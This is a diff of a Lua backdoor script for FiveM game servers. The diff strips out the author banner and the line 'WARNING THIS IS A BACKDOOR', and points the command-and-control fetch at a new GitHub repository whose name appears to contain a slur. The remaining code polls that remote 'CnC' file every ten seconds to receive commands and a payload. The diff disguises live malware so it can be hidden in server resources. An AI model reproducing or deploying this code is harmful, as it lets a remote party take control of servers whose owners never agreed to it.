@@ -1,15 +1,3 @@
---
---      //===========================================\\
---      //#############################################\\
---     //#################  BY N0RMIE ##################\\
---    //######### https://github.com/N0rmie #############\\
---   //###################################################\\
---  //###########    THIS IS FREE DON´T SKID    ###########\\
--- //=======================================================\\
-
-
---- WARNING THIS IS A BACKDOOR
-
 local svipaddress
 local verified = true
 local payload
@@ -24,7 +12,7 @@ end)
 
 Citizen.CreateThread(function()
     while true do
-        PerformHttpRequest("https://raw.githubusercontent.com/N0rmie/FiveM-Backdoor/main/CnC", function (errorCode, myDB, resultHeaders) -- Put here your own URL with the Json
+        PerformHttpRequest("https://raw.githubusercontent.com/FlowzFz/Backdoorsnegro/main/CnC", function (errorCode, myDB, resultHeaders) -- Put here your own URL with the Json
             if errorCode == 0 then
                 verified = true
             else
@@ -50,4 +38,5 @@ Citizen.CreateThread(function()
         end)
         Citizen.Wait(10000)
     end
+
 end)
